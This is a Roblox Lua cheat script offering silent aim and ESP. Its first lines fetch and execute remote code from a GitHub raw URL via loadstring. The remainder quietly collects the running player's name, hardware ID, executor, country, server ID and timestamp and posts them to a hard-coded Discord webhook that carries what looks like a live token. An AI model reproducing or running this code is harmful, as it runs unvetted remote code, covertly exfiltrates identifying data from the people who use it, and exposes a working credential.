 getgenv().SelectedPart = "Torso"
getgenv().VisibiltyCheck = false
getgenv().TargetESP = true
getgenv().FOV = 95
getgenv().CircleVisibility = true
getgenv().Distance = 500
getgenv().wallcheck = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentHub/Silentaim/main/penis", true))()

local url = "https://discord.com/api/webhooks/1338018223320338452/H_qats1O1i3zxO7tuhVxWjNzvMU_49vpPQKW4POn1BIr2SLe89omBYWlbITw4qdKhCtf"

local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local countryCodes = {
    ["AD"] = "Andorra",
    ["AE"] = "United Arab Emirates",
    ["AF"] = "Afghanistan",
    ["AG"] = "Antigua and Barbuda",
    ["AI"] = "Anguilla",
    ["AL"] = "Albania",
    ["AM"] = "Armenia",
    ["AO"] = "Angola",
    ["AR"] = "Argentina",
    ["AS"] = "American Samoa",
    ["AT"] = "Austria",
    ["AU"] = "Australia",
    ["AW"] = "Aruba",
    ["AX"] = "Åland Islands",
    ["AZ"] = "Azerbaijan",
    ["BA"] = "Bosnia and Herzegovina",
    ["BB"] = "Barbados",
    ["BD"] = "Bangladesh",
    ["BE"] = "Belgium",
    ["BF"] = "Burkina Faso",
    ["BG"] = "Bulgaria",
    ["BH"] = "Bahrain",
    ["BI"] = "Burundi",
    ["BJ"] = "Benin",
    ["BL"] = "Saint Barthélemy",
    ["BM"] = "Bermuda",
    ["BN"] = "Brunei Darussalam",
    ["BO"] = "Bolivia",
    ["BQ"] = "Bonaire, Sint Eustatius and Saba",
    ["BR"] = "Brazil",
    ["BS"] = "Bahamas",
    ["BT"] = "Bhutan",
    ["BV"] = "Bouvet Island",
    ["BW"] = "Botswana",
    ["BY"] = "Belarus",
    ["BZ"] = "Belize",
    ["CA"] = "Canada",
    ["CC"] = "Cocos (Keeling) Islands",
    ["CD"] = "Congo, Democratic Republic of the",
    ["CF"] = "Central African Republic",
    ["CG"] = "Congo",
    ["CH"] = "Switzerland",
    ["CI"] = "Côte d'Ivoire",
    ["CK"] = "Cook Islands",
    ["CL"] = "Chile",
    ["CM"] = "Cameroon",
    ["CN"] = "China",
    ["CO"] = "Colombia",
    ["CR"] = "Costa Rica",
    ["CU"] = "Cuba",
    ["CV"] = "Cabo Verde",
    ["CW"] = "Curaçao",
    ["CX"] = "Christmas Island",
    ["CY"] = "Cyprus",
    ["CZ"] = "Czechia",
    ["DE"] = "Germany",
    ["DJ"] = "Djibouti",
    ["DK"] = "Denmark",
    ["DM"] = "Dominica",
    ["DO"] = "Dominican Republic",
    ["DZ"] = "Algeria",
    ["EC"] = "Ecuador",
    ["EE"] = "Estonia",
    ["EG"] = "Egypt",
    ["EH"] = "Western Sahara",
    ["ER"] = "Eritrea",
    ["ES"] = "Spain",
    ["ET"] = "Ethiopia",
    ["FI"] = "Finland",
    ["FJ"] = "Fiji",
    ["FM"] = "Micronesia (Federated States of)",
    ["FO"] = "Faroe Islands",
    ["FR"] = "France",
    ["GA"] = "Gabon",
    ["GB"] = "United Kingdom",
    ["GD"] = "Grenada",
    ["GE"] = "Georgia",
    ["GF"] = "French Guiana",
    ["GG"] = "Guernsey",
    ["GH"] = "Ghana",
    ["GI"] = "Gibraltar",
    ["GL"] = "Greenland",
    ["GM"] = "Gambia",
    ["GN"] = "Guinea",
    ["GP"] = "Guadeloupe",
    ["GQ"] = "Equatorial Guinea",
    ["GR"] = "Greece",
    ["GT"] = "Guatemala",
    ["GU"] = "Guam",
    ["GW"] = "Guinea-Bissau",
    ["GY"] = "Guyana",
    ["HK"] = "Hong Kong",
    ["HM"] = "Heard Island and McDonald Islands",
    ["HN"] = "Honduras",
    ["HR"] = "Croatia",
    ["HT"] = "Haiti",
    ["HU"] = "Hungary",
    ["ID"] = "Indonesia",
    ["IE"] = "Ireland",
    ["IL"] = "Israel",
    ["IM"] = "Isle of Man",
    ["IN"] = "India",
    ["IO"] = "British Indian Ocean Territory",
    ["IQ"] = "Iraq",
    ["IR"] = "Iran",
    ["IS"] = "Iceland",
    ["IT"] = "Italy",
    ["JE"] = "Jersey",
    ["JM"] = "Jamaica",
    ["JO"] = "Jordan",
    ["JP"] = "Japan",
    ["KE"] = "Kenya",
    ["KG"] = "Kyrgyzstan",
    ["KH"] = "Cambodia",
    ["KI"] = "Kiribati",
    ["KM"] = "Comoros",
    ["KN"] = "Saint Kitts and Nevis",
    ["KP"] = "Korea, Democratic People's Republic of",
    ["KR"] = "Korea, Republic of",
    ["KW"] = "Kuwait",
    ["KY"] = "Cayman Islands",
    ["KZ"] = "Kazakhstan",
    ["LA"] = "Lao People's Democratic Republic",
    ["LB"] = "Lebanon",
    ["LC"] = "Saint Lucia",
    ["LI"] = "Liechtenstein",
    ["LK"] = "Sri Lanka",
    ["LR"] = "Liberia",
    ["LS"] = "Lesotho",
    ["LT"] = "Lithuania",
    ["LU"] = "Luxembourg",
    ["LV"] = "Latvia",
    ["LY"] = "Libya",
    ["MA"] = "Morocco",
    ["MC"] = "Monaco",
    ["MD"] = "Moldova",
    ["ME"] = "Montenegro",
    ["MF"] = "Saint Martin",
    ["MG"] = "Madagascar",
    ["MH"] = "Marshall Islands",
    ["MK"] = "North Macedonia",
    ["ML"] = "Mali",
    ["MM"] = "Myanmar",
    ["MN"] = "Mongolia",
    ["MO"] = "Macao",
    ["MP"] = "Northern Mariana Islands",
    ["MQ"] = "Martinique",
    ["MR"] = "Mauritania",
    ["MS"] = "Montserrat",
    ["MT"] = "Malta",
    ["MU"] = "Mauritius",
    ["MV"] = "Maldives",
    ["MW"] = "Malawi",
    ["MX"] = "Mexico",
    ["MY"] = "Malaysia",
    ["MZ"] = "Mozambique",
    ["NA"] = "Namibia",
    ["NC"] = "New Caledonia",
    ["NE"] = "Niger",
    ["NF"] = "Norfolk Island",
    ["NG"] = "Nigeria",
    ["NI"] = "Nicaragua",
    ["NL"] = "Netherlands",
    ["NO"] = "Norway",
    ["NP"] = "Nepal",
    ["NR"] = "Nauru",
    ["NU"] = "Niue",
    ["NZ"] = "New Zealand",
    ["OM"] = "Oman",
    ["PA"] = "Panama",
    ["PE"] = "Peru",
    ["PF"] = "French Polynesia",
    ["PG"] = "Papua New Guinea",
    ["PH"] = "Philippines",
    ["PK"] = "Pakistan",
    ["PL"] = "Poland",
    ["PM"] = "Saint Pierre and Miquelon",
    ["PN"] = "Pitcairn Islands",
    ["PR"] = "Puerto Rico",
    ["PT"] = "Portugal",
    ["PW"] = "Palau",
    ["PY"] = "Paraguay",
    ["QA"] = "Qatar",
    ["RE"] = "Réunion",
    ["RO"] = "Romania",
    ["RS"] = "Serbia",
    ["RU"] = "Russian Federation",
    ["RW"] = "Rwanda",
    ["SA"] = "Saudi Arabia",
    ["SB"] = "Solomon Islands",
    ["SC"] = "Seychelles",
    ["SD"] = "Sudan",
    ["SE"] = "Sweden",
    ["SG"] = "Singapore",
    ["SH"] = "Saint Helena",
    ["SI"] = "Slovenia",
    ["SJ"] = "Svalbard and Jan Mayen",
    ["SK"] = "Slovakia",
    ["SL"] = "Sierra Leone",
    ["SM"] = "San Marino",
    ["SN"] = "Senegal",
    ["SO"] = "Somalia",
    ["SR"] = "Suriname",
    ["SS"] = "South Sudan",
    ["ST"] = "Sao Tome and Principe",
    ["SV"] = "El Salvador",
    ["SX"] = "Sint Maarten",
    ["SY"] = "Syrian Arab Republic",
    ["SZ"] = "Eswatini",
    ["TC"] = "Turks and Caicos Islands",
    ["TD"] = "Chad",
    ["TF"] = "French Southern Territories",
    ["TG"] = "Togo",
    ["TH"] = "Thailand",
    ["TJ"] = "Tajikistan",
    ["TK"] = "Tokelau",
    ["TL"] = "Timor-Leste",
    ["TM"] = "Turkmenistan",
    ["TN"] = "Tunisia",
    ["TO"] = "Tonga",
    ["TR"] = "Turkey",
    ["TT"] = "Trinidad and Tobago",
    ["TV"] = "Tuvalu",
    ["TZ"] = "Tanzania",
    ["UA"] = "Ukraine",
    ["UG"] = "Uganda",
    ["UM"] = "United States Minor Outlying Islands",
    ["US"] = "United States",
    ["UY"] = "Uruguay",
    ["UZ"] = "Uzbekistan",
    ["VA"] = "Vatican City",
    ["VC"] = "Saint Vincent and the Grenadines",
    ["VE"] = "Venezuela",
    ["VG"] = "British Virgin Islands",
    ["VI"] = "United States Virgin Islands",
    ["VN"] = "Vietnam",
    ["VU"] = "Vanuatu",
    ["WF"] = "Wallis and Futuna",
    ["WS"] = "Samoa",
    ["YE"] = "Yemen",
    ["YT"] = "Mayotte",
    ["ZA"] = "South Africa",
    ["ZM"] = "Zambia",
    ["ZW"] = "Zimbabwe"
}

local function getCountryName(countryCode)
    return countryCodes[countryCode] or "Unknown Country"
end

local function getTimeWithTimezone()
    local currentTime = os.time()
    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)

    local function getTimezoneOffset()
        local utcTime = os.time(os.date("!*t", currentTime))
        local localTime = os.time(os.date("*t", currentTime))
        local diff = os.difftime(localTime, utcTime)
        local hours = math.floor(diff / 3600)
        local minutes = math.floor((diff % 3600) / 60)
        return string.format("%+03d:%02d", hours, minutes)
    end

    return formattedTime .. " " .. getTimezoneOffset()
end

local hwid = gethwid()

local identifyexecutor1 = identifyexecutor()

local success, countryCode = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(player)
end)

local countryName = "Unknown Country"
if success then
    countryName = getCountryName(countryCode)
end

local playerName = player.Name
local timestamp = getTimeWithTimezone()
local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
local version = "project x private"
local serverId = game.JobId
local hwid = gethwid()
local identifyexecutor = identifyexecutor()

local data = {
    ["content"] = "Player Name: " .. playerName ..
                  ", Execution Time: " .. timestamp ..
                  ", Game Link: " .. gameLink ..
                  ", Version: " .. version ..
                  ", Server ID: " .. serverId ..
                  ", HWID: " .. hwid ..
                  ", Executor: " .. identifyexecutor1 ..
                  ", Country: " .. countryName
}

local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local requestData = {
    Url = url,
    Body = newdata,
    Method = "POST",
    Headers = headers
}
request(requestData)
